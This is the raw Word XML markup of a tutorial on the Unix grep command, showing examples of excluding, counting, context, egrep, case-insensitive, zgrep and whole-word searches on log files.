        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>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noProof/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29C46E7E" wp14:editId="4AB91F43">
            <wp:extent cx="5943600" cy="3733165"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="34" name="Picture 34" descr="10 ways to use Grep command in Unix - example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0 ways to use Grep command in Unix - example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1498220A"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r>
    </w:p>
    <w:p w14:paraId="2B5E89E3"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t>Example 1: How to ignore some words while doing a search using grep in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DCA267"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 xml:space="preserve">Finding relevant word and exclusion of irrelevant word. Most of the time I look for Exception and Errors in log files and sometimes I know certain Exception I can ignore </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>so I use grep -v option to exclude those Exceptions</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7F4F3A8E"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Exception logfile.txt |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-v ERROR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D86646E"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This grep command example will search for word "Exception" in logfile.txt and print them but since we have piped out of first grep command to second grep command which will exclude all lines which match world "ERROR". To make this grep example more concrete let's see another example, here we have a file which contains three lines as shown below:</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47C799C4"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cat example.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F62CAD2"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UNIX operating </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0BB33B"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UNIX </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Linux operating </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E7A937"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Linux operation </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D536118"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Now we want to search all lines in file example.txt which contains word UNIX but same time doesn't contain world Linux.</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62C0C5CF"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UNIX example.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18718C37"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UNIX operating </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571CD0AD"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UNIX </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Linux operating </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077E6D9E"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
    <w:p w14:paraId="1840080A"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Now to exclude all lines which contain Linux we will apply another grep command in this output with option -v to exclude matching word as shown in below grep command:</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6B811F9A"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UNIX example.txt |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-v Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A64B15"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UNIX operating </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9B5373"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p>
    <w:p w14:paraId="3ADD2F0E"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t>Example 2: How to count the occurrence of a word in a file using grep command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5263027A"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lastRenderedPageBreak/>
        <w:t>If you want to count on a particular word in the log file you can use grep -c option to count the word. Below an example of command will print how many times the word "Error" has appeared in logfile.txt.</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3B62ECB8"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-c</w:t>
      </w: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61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"Error"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> logfile.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2025FC"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If we apply this grep command on our example file to find how many lines contain word e.g. UNIX has occurred in the file:</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355E17E7"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-c</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> UNIX example.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C7CD36"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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1877B9"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p>
    <w:p w14:paraId="7EB5A548"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t>Example 3: printing lines before and after of matching word using grep</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1992BA63"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Sometimes we are not just interested in matching line but also on lines around matching lines particularly useful to see what happens before any Error or Exception. grep --context option allows us to print lines around matching pattern. Below an example of grep command in UNIX will print 6 lines around matching line of word "successful" in logfile.txt</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2D052BED"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--context=6 successful logfile.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A72F346"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Show an additional six lines after matching very useful to see what is around and to print the whole message if it splits around multiple lines. You can also use command line option "C" instead of "--context" for example</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66EB858A"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-C</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'hello'</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746EF96A"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Prints two lines of context around each matching line.</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60634221"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Example 4: How to search pattern using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>egrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and regular expression</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AECD81C"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stands for extended grep and it is more powerful than grep command in Unix and allows more regular exception like you can use "|" option to search for either Error or Exception by executing just one command.</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4B2B8822"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>egrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Error|Exception</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> logfile.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601251A6"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r>
    </w:p>
    <w:p w14:paraId="39D32A37"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t>Example 5: How to do case-insensitive searching using grep in Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750762CF"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If you want to do case insensitive search then use -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option from grep command in UNIX. grep -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command will find an occurrence of both Error, error, and ERROR and quite useful to display any sort of Error from the log file.</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37668F71"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Error logfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7499BFC8"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p>
    <w:p w14:paraId="495F64C6"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t xml:space="preserve">Example 6: How to search patterns in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> files using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>zgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA9E95A"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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>zgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is another great version of grep command in Unix which is used to perform the same operation as grep does but with .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> files. Many times we </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the old file to reduce the size and later wants to look or find something on those files. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>zgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is your man for those days. Below command will print all files which have "Error" on them.</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706A1156"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>zgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Error *.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>gz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="302802F5"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r>
    </w:p>
    <w:p w14:paraId="0A064E71"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t>Example 7: How to search the whole word in a file using grep command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFC0BEF"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lastRenderedPageBreak/>
        <w:t>You can use grep -w command in UNIX to find the whole word instead of a just pattern, as shown in the following the example. This example will only print lines from logfile.txt which contains full word ERROR.</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1662A339"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-w</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ERROR logfile.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611C7B8D"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Above grep command in UNIX searches only for instances of 'ERROR' that are entire words; it does not match `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>SysERROR</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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br/>
        <w:t>For more control, use `\&lt;' and `\&gt;' to match the start and end of words. For example:</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1CBCB2C1"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61CE3C"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'ERROR&gt;'</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
